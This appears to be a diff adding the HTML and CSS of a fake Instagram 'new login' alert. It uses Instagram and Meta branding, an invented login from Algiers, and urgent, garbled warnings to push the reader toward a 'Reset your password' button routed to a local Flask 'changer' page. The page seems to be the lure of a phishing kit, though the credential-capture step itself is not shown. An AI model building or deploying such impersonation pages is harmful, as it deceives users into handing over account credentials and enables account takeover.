@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Instagram Login Alert</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- AJOUT IMPORTANT -->
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+<link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
+
+<style>
+body{
+    background:#f4f4f4;
+    font-family: Arial, Helvetica, sans-serif;
+    display:flex;
+    justify-content:center;
+    align-items:flex-start; /* Changé de center à flex-start */
+    min-height:100vh; /* Changé de height à min-height */
+    margin:0; /* Ajouté */
+    padding:15px; /* Ajouté pour éviter les bords collés */
+    box-sizing:border-box;
+}
+
+.card{
+    width:100%; /* Changé de 380px fixe à 100% */
+    max-width:400px; /* Garde une limite mais s'adapte */
+    background:white;
+    border-radius:20px; /* Un peu plus arrondi */
+    box-shadow:0 4px 20px rgba(0,0,0,0.08);
+    padding:25px 20px; /* Réduit légèrement le padding */
+    margin:10px auto;
+}
+
+/* HEADER */
+.header{
+    display:flex;
+    align-items:center;
+    justify-content:flex-start;
+    gap:8px; /* Réduit pour mobile */
+    margin-bottom:20px;
+    flex-wrap:wrap; /* Permet de s'adapter si besoin */
+}
+
+.header i{
+    font-size:24px; /* Légèrement réduit */
+    color:#000;
+}
+
+.divider{
+    font-size:22px;
+    color:#000;
+    line-height:1;
+}
+
+.logo{
+    font-family:'Billabong', cursive;
+    font-size:30px; /* Réduit pour mobile */
+    color:#000;
+    line-height:1;
+}
+
+.title{
+    font-size:20px; /* Réduit */
+    margin-bottom:5px;
+    text-align:center;
+    word-break:break-word; /* Évite les débordements */
+}
+
+.subtitle{
+    font-size:13px; /* Réduit */
+    color:#777;
+    margin-bottom:20px;
+    text-align:center;
+    padding:0 10px; /* Ajoute un peu d'espace */
+}
+
+/* Circle phone icon */
+.circle{
+    width:80px; /* Réduit pour mobile */
+    height:80px; /* Réduit pour mobile */
+    border:2px solid #000;
+    border-radius:50%;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    margin:0 auto 20px auto;
+}
+
+.circle img{
+    width:35px; /* Réduit */
+}
+
+.device{
+    font-size:15px;
+    font-weight:500;
+    margin-bottom:5px;
+    text-align:center;
+    padding:0 10px;
+    word-break:break-word;
+}
+
+.date{
+    font-size:13px;
+    color:#888;
+    text-align:center;
+    margin-bottom:40px; /* Réduit */
+}
+
+.hdra{
+    font-size:13px; /* Réduit */
+    color:#888;
+    text-align:center;
+    margin-top:30px; /* Réduit */
+    margin-bottom:25px;
+    line-height:1.5; /* Meilleure lisibilité */
+    padding:0 5px;
+}
+
+.reset-btn {
+    background-color: #007bff;
+    color: white;
+    padding:12px 24px; /* Plus gros pour mobile */
+    border: none;
+    border-radius:8px; /* Ajouté arrondi */
+    cursor: pointer;
+    font-size:16px;
+    width:100%; /* Pleine largeur sur mobile */
+    max-width:280px; /* Mais limité */
+    transition:background-color 0.3s;
+}
+
+.reset-btn:hover {
+    background-color: #0056b3;
+}
+
+.container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    width:100%;
+}
+
+.ma-classe-image {
+    display: block;
+    margin:5px auto; /* Ajusté */
+    width: 40%;
+    max-width:60px; /* Réduit */
+    border-radius: 0px;
+}
+
+/* Media Query pour très petits écrans */
+@media (max-width: 400px) {
+    .card {
+        padding:20px 15px;
+    }
+    
+    .logo {
+        font-size:26px;
+    }
+    
+    .title {
+        font-size:18px;
+    }
+    
+    .circle {
+        width:70px;
+        height:70px;
+    }
+    
+    .circle img {
+        width:30px;
+    }
+}
+
+/* Pour les grands écrans, garder la carte centrée */
+@media (min-width: 768px) {
+    body {
+        align-items:center;
+    }
+}
+</style>
+</head>
+<body>
+
+<div class="card">
+    
+    <div class="header">
+        <i class="fa-brands fa-instagram"></i>
+        <span class="divider">|</span>
+        <div class="logo">Instagram</div>
+    </div>
+
+    <div class="title">
+        We noticed a new login
+    </div>
+
+    <div class="subtitle">
+        We noticed a login from a device you don't usually use.
+    </div>
+
+    <div class="circle">
+        <img src="https://cdn-icons-png.flaticon.com/512/15/15874.png" alt="Phone Icon">
+    </div>
+
+    <div class="device">
+        Apple iPhone · Instagram · Algiers, Algeria
+    </div>
+
+    <div class="date">
+        August 17 at 4:12 PM (PDT)
+    </div>
+    
+    <div class="hdra">
+        If this was you, you won't be able to access your account. certain security measures have been taken for few days.if this wasn't you, you can regain access to your account by <a href="changer.html">resetting your password</a>.
+    </div>
+
+    <div class="container">
+        <form action="{{ url_for('changer') }}" method="get">
+         <button type="submit" class="reset-btn">Reset your password</button>
+        </form>
+    </div>
+
+    <div class="hdra">
+        from
+        <img src="images.png" alt="Description" class="ma-classe-image">
+        © Instagram. Meta Platforms, inc. <a href="#">1601 Willow Road, Menlo Park, CA 94025</a> <br><br>
+        this message was sent to you because you have an Instagram account or because someone used your email address to create an Instagram account. Not your account? You can <a href="#">remove your email</a> from this account.
+    </div>
+    
+</div>
+
+</body>
+</html>
